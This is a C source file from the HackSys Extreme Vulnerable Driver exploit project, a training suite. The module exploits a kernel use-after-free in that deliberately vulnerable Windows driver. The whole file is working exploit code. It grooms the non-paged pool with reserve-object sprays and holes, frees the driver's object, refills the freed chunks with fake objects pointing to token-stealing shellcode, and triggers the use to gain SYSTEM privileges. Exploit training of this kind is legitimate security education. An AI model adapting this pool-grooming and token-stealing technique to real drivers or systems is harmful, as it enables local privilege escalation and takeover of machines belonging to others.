/*++

 /$$   /$$                     /$$        /$$$$$$                     
| $$  | $$                    | $$       /$$__  $$                    
| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$| $$  \__/ /$$   /$$  /$$$$$$$
| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/|  $$$$$$ | $$  | $$ /$$_____/
| $$__  $$  /$$$$$$$| $$      | $$$$$$/  \____  $$| $$  | $$|  $$$$$$ 
| $$  | $$ /$$__  $$| $$      | $$_  $$  /$$  \ $$| $$  | $$ \____  $$
| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$/|  $$$$$$$ /$$$$$$$/
|__/  |__/ \_______/ \_______/|__/  \__/ \______/  \____  $$|_______/ 
                                                   /$$  | $$          
                                                  |  $$$$$$/          
                                                   \______/           


Copyright (C) 2010-2015 HackSys Team. All rights reserved.

This file is part of HackSys Extreme Vulnerable Driver Exploit.

See the file 'LICENSE' for copying permission.

Author : Ashfaq Ansari
Contact: ashfaq_ansari1989[at]hotmail.com
Website: http://hacksys.vfreaks.com

Project Name:
    HackSys Extreme Vulnerable Driver Exploit

Module Name:
    UseAfterFree.c

Abstract:
    This module implements the exploit for Use After Free 
    Vulnerability implemented in HackSys Extreme Vulnerable 
    Driver.

--*/

#include "UseAfterFree.h"

VOID SprayNonPagedPoolWithReserveObjects() {
    UINT32 i = 0;
    HMODULE hModule = NULL;
    NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

    hModule = LoadLibraryA("ntdll.dll");

    if (!hModule) {
        DEBUG_ERROR("\t\t[-] Failed To Load NtDll.dll: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(hModule, "NtAllocateReserveObject");

    if (!NtAllocateReserveObject) {
        DEBUG_ERROR("\t\t[-] Failed Resolving NtAllocateReserveObject: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    RtlFillMemory(hReserveObjectArrayA, sizeof(hReserveObjectArrayA), 0x0);
    RtlFillMemory(hReserveObjectArrayB, sizeof(hReserveObjectArrayB), 0x0);

    for (i = 0; i < 10000; i++) {
        ntStatus = NtAllocateReserveObject(&hReserveObjectArrayA[i], 0, IO_COMPLETION_OBJECT);
        if (ntStatus != STATUS_SUCCESS) {
            DEBUG_ERROR("\t\t[-] Failed To Allocate Reserve Objects: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }

    for (i = 0; i < 5000; i++) {
        ntStatus = NtAllocateReserveObject(&hReserveObjectArrayB[i], 0, IO_COMPLETION_OBJECT);
        if (ntStatus != STATUS_SUCCESS) {
            DEBUG_ERROR("\t\t[-] Failed To Allocate Reserve Objects: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }
}

VOID CreateHolesInNonPagedPoolByClosingReserveObjects() {
    UINT32 i = 0;

    for (i = 0; i < 5000; i += 2) {
        if (!CloseHandle(hReserveObjectArrayB[i])) {
            DEBUG_ERROR("\t\t[-] Failed To Close Reserve Objects Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }
}

VOID FreeReserveObjects() {
    UINT32 i = 0;

    for (i = 0; i < 10000; i++) {
        if (!CloseHandle(hReserveObjectArrayA[i])) {
            DEBUG_ERROR("\t\t[-] Failed To Close Reserve Objects Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }

    for (i = 1; i < 5000; i +=2) {
        if (!CloseHandle(hReserveObjectArrayB[i])) {
            DEBUG_ERROR("\t\t[-] Failed To Close Reserve Objects Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
    }
}

DWORD WINAPI UseAfterFreeThread(LPVOID lpParameter) {
    UINT32 i = 0;
    HANDLE hFile = NULL;
    DWORD lpBytesReturned;
    PFAKE_OBJECT pFakeObject = NULL;
    LPCSTR lpFileName = (LPCSTR)DEVICE_NAME;
    PVOID pEopShellcode = &TokenStealingShellcodeWin7Generic;

    __try {
        DEBUG_MESSAGE("\t[+] Setting Thread Priority\n");

        if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
            DEBUG_ERROR("\t\t[-] Failed To Set As THREAD_PRIORITY_HIGHEST\n");
        }
        else {
            DEBUG_INFO("\t\t[+] Priority Set To THREAD_PRIORITY_HIGHEST\n");
        }

        // Get the device handle
        DEBUG_MESSAGE("\t[+] Getting Device Driver Handle\n");
        DEBUG_INFO("\t\t[+] Device Name: %s\n", lpFileName);

        hFile = GetDeviceHandle(lpFileName);

        if (hFile == INVALID_HANDLE_VALUE) {
            DEBUG_ERROR("\t\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t[+] Device Handle: 0x%X\n", hFile);
        }

        DEBUG_MESSAGE("\t[+] Setting Up Vulnerability Stage\n");

        DEBUG_INFO("\t\t[+] Allocating Memory For Buffer\n");

        pFakeObject = (PFAKE_OBJECT)HeapAlloc(GetProcessHeap(),
                                              HEAP_ZERO_MEMORY,
                                              sizeof(FAKE_OBJECT));

        if (!pFakeObject) {
            DEBUG_ERROR("\t\t\t[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
            exit(EXIT_FAILURE);
        }
        else {
            DEBUG_INFO("\t\t\t[+] Memory Allocated: 0x%p\n", pFakeObject);
            DEBUG_INFO("\t\t\t[+] Allocation Size: 0x%X\n", sizeof(FAKE_OBJECT));
        }

        DEBUG_INFO("\t\t[+] Preparing FAKE_OBJECT structure\n");

        RtlFillMemory((PVOID)pFakeObject, sizeof(FAKE_OBJECT), 0x41);
        pFakeObject->buffer[sizeof(pFakeObject->buffer) - 1] = '\0';
        *(PULONG)pFakeObject = (ULONG)pEopShellcode;

        DEBUG_INFO("\t\t\t[+] pFakeObject Value: 0x%p\n", *(PULONG)pFakeObject);
        DEBUG_INFO("\t\t\t[+] pFakeObject Address: 0x%p\n", pFakeObject);
        DEBUG_INFO("\t\t\t[+] FAKE_OBJECT Size: 0x%X\n", sizeof(FAKE_OBJECT));

        DEBUG_INFO("\t\t\t[+] EoP Payload: 0x%p\n", pEopShellcode);

        DEBUG_INFO("\t\t[+] Preparing NonPaged Kernel Pool Layout\n");

        DEBUG_INFO("\t\t\t[+] Spraying With Reserve Objects\n");

        SprayNonPagedPoolWithReserveObjects();

        DEBUG_INFO("\t\t\t[+] Creating Holes\n");

        CreateHolesInNonPagedPoolByClosingReserveObjects();

        DEBUG_INFO("\t\t[+] Working With Vulnerable UaF Object In NonPaged Pool\n");
        DEBUG_INFO("\t\t\t[+] Allocating UaF Object\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_CREATE_UAF_OBJECT,
                        NULL,
                        0,
                        NULL,
                        0,
                        &lpBytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        DEBUG_INFO("\t\t\t[+] Freeing UaF Object\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT,
                        NULL,
                        0,
                        NULL,
                        0,
                        &lpBytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        // Create the FAKE_OBJECT multiple times to
        // take up the freed memory chunk
        DEBUG_INFO("\t\t\t[+] Filling Freed Chunks\n");

        OutputDebugString("****************Kernel Mode****************\n");

        for (i = 0; i < 0x1000; i++) {
            DeviceIoControl(hFile,
                            HACKSYS_EVD_IOCTL_CREATE_FAKE_OBJECT,
                            (LPVOID)pFakeObject,
                            0,
                            NULL,
                            0,
                            &lpBytesReturned,
                            NULL);
        }

        OutputDebugString("****************Kernel Mode****************\n");

        DEBUG_INFO("\t\t\t[+] Freeing Reserve Objects\n");

        FreeReserveObjects();

        DEBUG_MESSAGE("\t[+] Triggering Kernel Use After Free\n");

        OutputDebugString("****************Kernel Mode****************\n");

        DeviceIoControl(hFile,
                        HACKSYS_EVD_IOCTL_USE_UAF_OBJECT,
                        NULL,
                        0,
                        NULL,
                        0,
                        &lpBytesReturned,
                        NULL);

        OutputDebugString("****************Kernel Mode****************\n");

        HeapFree(GetProcessHeap(), 0, (LPVOID)pFakeObject);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DEBUG_ERROR("\t\t[-] Exception: 0x%X\n", GetLastError());
        exit(EXIT_FAILURE);
    }

    return EXIT_SUCCESS;
}
